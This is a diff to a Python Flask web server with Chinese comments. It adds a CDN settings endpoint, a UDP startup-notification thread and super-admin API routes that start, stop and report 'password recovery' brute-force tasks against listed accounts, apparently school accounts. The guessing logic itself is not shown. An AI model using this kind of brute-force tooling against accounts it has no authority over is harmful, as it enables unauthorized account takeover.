+                config.read(CONFIG_FILE, encoding="utf-8")
+            else:
+                # 配置文件不存在，使用默认配置
+                logging.warning("[CDN配置] config.ini 文件不存在，将创建新的配置文件")
+                config = _get_default_config()
+            
+            # 确保[CDN]节存在
+            if not config.has_section("CDN"):
+                config.add_section("CDN")
+            
+            # 当前配置值（用于返回）
+            current_cdn_enabled = config.getboolean("CDN", "cdn_enabled", fallback=False)
+            current_cache_time = config.getint("CDN", "cache_time", fallback=3600)
+            
+            # 更新cdn_enabled配置（如果请求中提供了该字段）
+            if "cdn_enabled" in data:
+                # 将值转换为布尔类型，确保数据类型正确
+                cdn_enabled = bool(data["cdn_enabled"])
+                config.set("CDN", "cdn_enabled", str(cdn_enabled).lower())
+                current_cdn_enabled = cdn_enabled
+            
+            # 更新cache_time配置（如果请求中提供了该字段）
+            if "cache_time" in data:
+                # 将值转换为整数类型
+                cache_time = int(data["cache_time"])
+                
+                # 验证缓存时间是否为非负数
+                if cache_time < 0:
+                    # 缓存时间不能为负数，返回错误
+                    return jsonify({
+                        "success": False,
+                        "message": "缓存时间必须大于等于0"
+                    }), 400
+                
+                # 验证通过，更新配置
+                config.set("CDN", "cache_time", str(cache_time))
+                current_cache_time = cache_time
+            
+            # 使用_write_config_with_comments函数保存配置以保留注释
+            _write_config_with_comments(config, CONFIG_FILE)
+            
+            # 组装返回的配置数据
+            saved_config = {
+                "cdn_enabled": current_cdn_enabled,
+                "cache_time": current_cache_time
+            }
+            
+            # 记录日志
+            logging.info(f"[CDN配置] {g.user} 更新CDN配置: {saved_config}")
+            
+            # 返回成功响应
+            return jsonify({
+                "success": True,
+                "message": "配置已保存，立即生效",
+                "config": saved_config
+            })
+
+        except ValueError as e:
+            # 捕获值转换错误（例如字符串转整数失败）
+            logging.error(f"[CDN配置] 配置数据类型错误: {e}")
+            return jsonify({"success": False, "message": f"配置数据格式错误: {str(e)}"}), 400
+        
+        except Exception as e:
+            # 捕获其他所有异常
+            logging.error(f"[CDN配置] 更新配置失败: {e}", exc_info=True)
+            return jsonify({"success": False, "message": f"更新配置失败: {str(e)}"}), 500
+
+    # ============================================================================
+    # 密码恢复（暴力破解）API（仅超级管理员）
+    # 警告：此功能仅用于合法的学校账号密码恢复
+    # ============================================================================
+
+    def check_super_admin_permission():
+        """
+        检查当前用户是否为超级管理员
+        
+        返回:
+            tuple: (is_super_admin: bool, error_response: tuple|None)
+                   如果不是超级管理员，返回(False, error_response)
+                   如果是超级管理员，返回(True, None)
+        """
+        try:
+            config = configparser.ConfigParser()
+            config.read(CONFIG_FILE, encoding="utf-8")
+            super_admin = config.get("Admin", "super_admin", fallback="admin")
+            
+            if g.user != super_admin:
+                logging.warning(f"[权限检查] 非超级管理员 {g.user} 尝试访问超级管理员功能")
+                return False, (jsonify({"success": False, "message": "权限不足：需要超级管理员权限"}), 403)
+            
+            return True, None
+        except Exception as e:
+            logging.error(f"[权限检查] 检查超级管理员权限失败: {e}", exc_info=True)
+            return False, (jsonify({"success": False, "message": "权限检查失败"}), 500)
+
+    @app.route("/api/admin/bruteforce/start", methods=["POST"])
+    @login_required
+    def start_bruteforce():
+        """
+        启动密码恢复任务
+        需要超级管理员权限
+        """
+        try:
+            # 检查是否为超级管理员
+            is_super_admin, error_response = check_super_admin_permission()
+            if not is_super_admin:
+                return error_response
+            
+            # 获取请求数据
+            data = request.get_json()
+            if not data or "accounts" not in data:
+                return jsonify({"success": False, "message": "缺少accounts参数"}), 400
+            
+            accounts = data["accounts"]
+            if not isinstance(accounts, list) or len(accounts) == 0:
+                return jsonify({"success": False, "message": "accounts必须是非空列表"}), 400
+            
+            # 检查brute_force_manager是否可用
+            global brute_force_manager
+            if not brute_force_manager:
+                return jsonify({"success": False, "message": "密码恢复管理器未初始化"}), 500
+            
+            # 启动每个账号的任务
+            results = []
+            for account in accounts:
+                result = brute_force_manager.start_task(account)
+                results.append({"account": account, "result": result})
+            
+            # 记录审计日志
+            logging.warning(f"[密码恢复] 超级管理员 {g.user} 启动了 {len(accounts)} 个账号的密码恢复任务：{accounts}")
+            
+            return jsonify({
+                "success": True,
+                "message": f"已启动 {len(accounts)} 个任务",
+                "results": results
+            })
+        
+        except Exception as e:
+            logging.error(f"[密码恢复] 启动任务失败: {e}", exc_info=True)
+            return jsonify({"success": False, "message": f"启动任务失败: {str(e)}"}), 500
+
+    @app.route("/api/admin/bruteforce/stop", methods=["POST"])
+    @login_required
+    def stop_bruteforce():
+        """
+        停止密码恢复任务
+        需要超级管理员权限
+        """
+        try:
+            # 检查是否为超级管理员
+            is_super_admin, error_response = check_super_admin_permission()
+            if not is_super_admin:
+                return error_response
+            
+            # 获取请求数据
+            data = request.get_json()
+            if not data:
+                return jsonify({"success": False, "message": "缺少请求数据"}), 400
+            
+            global brute_force_manager
+            if not brute_force_manager:
+                return jsonify({"success": False, "message": "密码恢复管理器未初始化"}), 500
+            
+            # 判断是停止全部还是停止指定账号
+            if data.get("all"):
+                result = brute_force_manager.stop_all_tasks()
+                logging.warning(f"[密码恢复] 超级管理员 {g.user} 停止了所有密码恢复任务")
+                return jsonify(result)
+            elif "accounts" in data:
+                accounts = data["accounts"]
+                if not isinstance(accounts, list):
+                    return jsonify({"success": False, "message": "accounts必须是列表"}), 400
+                
+                results = []
+                for account in accounts:
+                    result = brute_force_manager.stop_task(account)
+                    results.append({"account": account, "result": result})
+                
+                logging.warning(f"[密码恢复] 超级管理员 {g.user} 停止了账号的密码恢复任务：{accounts}")
+                
+                return jsonify({
+                    "success": True,
+                    "message": f"已处理 {len(accounts)} 个停止请求",
+                    "results": results
+                })
+            else:
+                return jsonify({"success": False, "message": "必须提供all或accounts参数"}), 400
+        
+        except Exception as e:
+            logging.error(f"[密码恢复] 停止任务失败: {e}", exc_info=True)
+            return jsonify({"success": False, "message": f"停止任务失败: {str(e)}"}), 500
+
+    @app.route("/api/admin/bruteforce/status", methods=["GET"])
+    @login_required
+    def get_bruteforce_status():
+        """
+        获取所有密码恢复任务的状态
+        需要超级管理员权限
+        """
+        try:
+            # 检查是否为超级管理员
+            is_super_admin, error_response = check_super_admin_permission()
+            if not is_super_admin:
+                return error_response
+            
+            global brute_force_manager
+            if not brute_force_manager:
+                return jsonify({"success": False, "message": "密码恢复管理器未初始化"}), 500
+            
+            tasks = brute_force_manager.get_all_tasks_status()
+            
+            return jsonify({
+                "success": True,
+                "tasks": tasks
+            })
+        
+        except Exception as e:
+            logging.error(f"[密码恢复] 获取任务状态失败: {e}", exc_info=True)
+            return jsonify({"success": False, "message": f"获取任务状态失败: {str(e)}"}), 500
 
     # ============================================================================
     # 应用主路由
@@ -19431,6 +20554,10 @@ def start_web_server(args_param):
                 logging.debug(
                     f"会话 {session_id} 调用 get_initial_data，更新活跃时间戳"
                 )
+                # 提取frontend_logs参数（如果存在）
+                if params and "frontend_logs" in params:
+                    # 将frontend_logs传递给get_initial_data方法
+                    pass  # 参数已在params中，会自动传递
 
             if hasattr(api_instance, method):
                 func = getattr(api_instance, method)
@@ -21725,6 +22852,21 @@ def start_web_server(args_param):
     print(f"  会话监控已启用（5分钟不活跃自动清理）")
     print(f"{'='*60}\n")
 
+    # [修正] 启动UDP通知线程（无论SSL是否启用，都在服务器启动前准备好）
+    # 将此逻辑移至 try 块之前，确保必然执行
+    def trigger_udp_notification():
+        # 直接调用具备重试逻辑的发送函数
+        # 函数内部已有30秒的健康检查轮询，无需额外封装
+        _send_startup_notification_to_log_forwarder(args.host, args.port)
+
+    udp_notification_thread = threading.Thread(
+        target=trigger_udp_notification,
+        daemon=True,
+        name="UDP_Startup_Notification"
+    )
+    udp_notification_thread.start()
+    logging.info("[系统启动] UDP通知服务线程已启动")
+
     try:
         if ssl_context:
             logging.info(
@@ -21842,6 +22984,17 @@ def start_web_server(args_param):
         else:
             logging.info(f"正在启动带有 WebSocket 支持的 Web 服务器于 {server_url}")
             try:
+                # 因为上方已经统一启动了 udp_notification_thread
+
+                @socketio.on('connect', namespace='/')
+                def on_first_connect():
+                    """首次连接时触发UDP通知（仅执行一次，作为健康检查的补充）"""
+                    if not hasattr(on_first_connect, 'notified'):
+                        on_first_connect.notified = True
+                        # 仅记录日志，主要通知任务交由主线程启动的 trigger_udp_notification 处理
+                        logging.debug("[SocketIO] 客户端首次连接确认")
+
+                # 启动SocketIO服务器（阻塞调用）
                 socketio.run(app, host=args.host, port=args.port, debug=False)
             except KeyboardInterrupt:
                 raise
